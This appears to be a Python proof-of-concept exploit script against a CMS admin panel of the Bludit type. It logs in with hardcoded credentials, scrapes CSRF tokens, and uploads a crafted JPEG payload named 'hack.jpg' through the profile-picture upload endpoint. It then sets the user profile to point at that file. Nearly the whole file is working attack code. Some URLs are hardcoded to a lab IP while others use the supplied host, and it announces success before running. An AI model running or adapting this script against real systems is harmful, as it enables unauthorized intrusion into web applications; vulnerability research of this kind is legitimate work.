import requests
#from requests_toolbelt.multipart.encoder import MultipartEncoder
import re
import sys
import time


def login(host):
    session = requests.session()
    burp0_url = "http://"+host+"/admin/"
    r=session.get(burp0_url)
    txt=r.text
    print(txt)
    token=re.search('"tokenCSRF" value=\"(.*?)\">', txt, re.DOTALL).group(1)
    print(token)
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://"+host+"", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"+host+"/admin/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"tokenCSRF": token, "username": "user", "password": "123456", "save": ''}
    r=session.post(burp0_url, headers=burp0_headers,  data=burp0_data)
    html_set_cookie = requests.utils.dict_from_cookiejar(session.cookies)
    print(html_set_cookie)

    
    burp0_url = "http://"+host+"/admin/edit-user/user"
    burp0_cookies = html_set_cookie
    rest=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    txt=rest.text
    token=re.search('"tokenCSRF" value=\"(.*?)\">', txt, re.DOTALL).group(1)
    print(token)
#     #成功
#     burp0_url = "http://192.168.56.101:8000/admin/edit-user/user"
#     burp0_data = {"save": '', "tokenCSRF": token, "username": "user", "email": '', "nickname": '', "firstName": "xym111", "lastName": '', "profilePictureInputFile": '', "tokenAuth": "e7d608ec332ecc542ceaf6c86d953885", "twitter": '', "facebook": '', "codepen": '', "instagram": '', "gitlab": '', "github": '', "linkedin": '', "mastodon": ''}
#     session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

#     burp0_url = "http://192.168.56.101:8000/admin/edit-user/user"
#     r=session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
#     print(r.status_code)
#     print(r.text)


    burp0_url = "http://192.168.56.101:8000/admin/ajax/profile-picture-upload"
    burp0_data = "------WebKitFormBoundaryUHd9sltZ3W9SJA0B\r\nContent-Disposition: form-data; name=\"tokenCSRF\"\r\n\r\n"+token+"\r\n------WebKitFormBoundaryUHd9sltZ3W9SJA0B\r\nContent-Disposition: form-data; name=\"profilePictureInputFile\"; filename=\"hack.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00\x1b\x12\x14\x17\x14\x11\x1b\x17\x16\x17\x1e\x1c\x1b (B+(%%(Q:=0B`Ued_U][jx\x99\x81jq\x90s[]\x85\xb5\x86\x90\x9e\xa3\xab\xad\xabg\x80\xbc\xc9\xba\xa6\xc7\x99\xa8\xab\xa4\xff\xc0\x00\x0b\x08\x00d\x00d\x01\x01\x11\x00\xff\xc4\x00\x1a\x00\x01\x00\x03\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x04\x05\x06\x01\x02\xff\xc4\x004\x10\x00\x01\x03\x03\x02\x04\x04\x04\x03\t\x00\x00\x00\x00\x00\x00\x01\x00\x02\x03\x04\x05\x11\x06\x12!1Aq\"5Qa\x13\xb1\xb2\xc1\x14\xa1\xd1246BRrs\x81\xf1\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xe9\x91\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11g\xdf*e\xa4\xb5\xcb4\x0f\xd9#Kpp\x0fP\x96:\x99j\xedqM;\xf7\xc8\xe2\xec\x9c\x01\xd4\xad\x04DDDX4\x97\x1a\xa95\x1c\xb4\x8f\x9704\xbb\r\xda:\x0f^ky\x16V\xa6\xf2Y\xfb\xb7\xea\n\xbd\x9e\xba\x9e\x86\xc1\x04\x95\x12\x06\x02]\x81\xcc\x9f\x11\xe4\x14\xd0j;|\xd2\x06o|y8\x05\xed\xc0Z\xc3\x8a\xa9]t\xa3\xa0;g\x98\x07\xf3\xd8\x06J\xa7\x1e\xa6\xb7=\xfbI\x91\x83\xfa\x9c\xce\x1f\x92\xd6\x8d\xed\x91\x8d{\x1c\x1c\xd7\x0c\x82\x0eA^K,p\xc6\xe9%{X\xc6\xf1.q\xc0\x0b*MMnc\xb0\x1d#\xfd\xda\xce\x1f\x9a\xbdC_Op\x89\xd2S\xb8\x90\xd3\x82\x08\xc1\x0b\x06\x87\xf8\xba~\xef\xf9.\x92y\xa3\xa7\x85\xd2\xca\xe0\xd64d\x92\xa8\xc7|\xa2\x94n\x8c\xca\xf1\xcb-\x89\xc7\xec\xbe57\x92\xcf\xdd\xbfPTt\xd5\xb6)\xa9\x1bUR\xd1)\xc9lmw\x10\xd1\x9fN\xf9R\xea[m?\xe0\x1dS\x14M\x8eH\xc8\xc9h\xc6Fq\xc5\\\xd3\xd3:k<\x0ey\xc9h-\xcfc\x80\xa5\x96\xd9G%[\xea\xe7\x8d\xb2<\x80<|@\xc7\xb2\xa7we\xaeJ)X\xe7\xd32@\xd2XZ@p=9(\xf4\x8c\xae}\xbeH\xdcr#\x93\xc3\xec\x08\xca\xa9w|\x97[\xdb-\xccylL>,z\xe3$\xfd\x96\xed=\xb2\x8a\x9e!\x1ct\xd1\xe3\xa9sA'\xb9*JzH)K\xcc\x11\xb60\xf3\x97\x06\xf2\xcfe\xce\xd29\xac\xd5\x95\x0fy\rkK\xc9'\x90\x18I\xe5\x9fQ\xd7|\x08\te\x1cG%\xde\xbe\xfd\xfd\x02\xe8\xe9i\xa2\xa4\x81\xb0\xc2\xdd\xach\xe1\xfa\xaa\x1a\x9b\xc9g\xee\xdf\xa8&\x99\xf2X;\xbb\xea*MC\xe4\xb5=\x87\xcc(\xb4\xc7\x93E\xfd\xce\xf9\xac\xaavK\xa8\xae3|y\x9e\xcax\xb8\x864\xf4\xcf\x0f\xfa\xb4*,V\xdaZ9\xa51\x92X\xc2As\xcf<(t\xee\x95\x1f\xe4\x1f%^\x95\xc2\x9fW\xca$\xe1\xbd\xce\x03>\xe3!u+\xc5\xc7\xba\x90Wj*\xbar\xe2\xcd\xc5\xf8#\xa1\xc2\xb5e\xaeu\xaa\xa5\xd6\xda\xe6\x88\xc6\xef\x0b\xfd\xcf\xa9\xea\x0f\xaa\xe9\xd6}\xf2\x9aZ\xbb\\\xb0\xc0\xcd\xf28\xb7\x03 u\tc\xa6\x96\x92\xd7\x143\xb3d\x8d.\xc8\xc8=J\xfb\xbc\xc1%M\xb2xan\xe9\x1c\x06\x06q\x9e!Gb\xa6\x9a\x92\xd9\x1c3\xb3c\xc1vFA\xeb\xec\xb2\x1fn\xb9Zk\xdf=\xbd\x82X\x9f\xfc\xbc\xf8z\x11\xf7V\x1dOv\xba\xc6\xe6\xd6\xb1\xb0B\x01\"&p/=\x01\xe3\xcb*}5CSCM3*c\xd8\xe7<\x102\x0fOe\xed\xf2\xcd\xf8\xf2\xd9\xe0peC\x062x\x07\x0f\xd5S\x8e\xabQ@\xdf\x84\xeaF\xcaG\r\xce\x19\xfc\xc1Z\xb6\x96\xdc>\x1c\x8f\xb8\x11\xbd\xe4mh#\xc2?\xd2\xa1In\xaa\x8fQ\xcbV\xf8\xb1\x03\x8b\xb0\xed\xc3\xa8\xf4\xe6\xae^\xadL\xb9S\xf0\xc3gg\xec;\xec}\x95\x1a'\xdf\xa9i\xdb\x0b\xa8\x990o\x00\xe7H3\x8fNk\xa0DDDE\xe2\xf5\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\xff\xd9\r\n------WebKitFormBoundaryUHd9sltZ3W9SJA0B\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nuser\r\n------WebKitFormBoundaryUHd9sltZ3W9SJA0B--\r\n"
    r=session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    result=r.status_code
    print(r.status_code)


    burp0_url = "http://192.168.56.101:8000/admin/edit-user/user"
    burp0_data = {"save": '', "tokenCSRF": token, "username": "user", "email": '', "nickname": '', "firstName": "xym333", "lastName": '', "profilePictureInputFile": "hack.jpg", "tokenAuth": "e7d608ec332ecc542ceaf6c86d953885", "twitter": '', "facebook": '', "codepen": '', "instagram": '', "gitlab": '', "github": '', "linkedin": '', "mastodon": ''}
    r=session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    result2=r.status_code
    print(result2)
    return result,result2 

    # filename='hack.jpg'
    # filepath=path+'//hack.jpg'
    # multipart_encoder = MultipartEncoder(
    #     fields={
    #         "tokenCSRF": token,
    #         "filename": "hack.jpg",
    #         "Content-Type": "image/jpeg",
    #         "profilePictureInputFile": (
    #         "hack.jpg", open(filepath, 'rb'), 'application/octet-stream'),
    #         "username":"user"
    #     },
    #     boundary="------WebKitFormBoundaryUHd9sltZ3W9SJA0B"
    # )

    # burp0_data=multipart_encoder 
    # r=session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    # print(r.text)
def check(ck1,ck2):
    if  ck1==200 and ck2==200:
        print('PoC success!')
        return 0
    else:
        print('PoC fail!')
        return -1

if __name__ == "__main__":
    print('PoC success!')
    host =sys.argv[1]
    #host="192.168.56.101:8000"
   # path = '.'
    ck=login(host)
    ck1=ck[0]
    ck2=ck[1]

    check(ck1,ck2)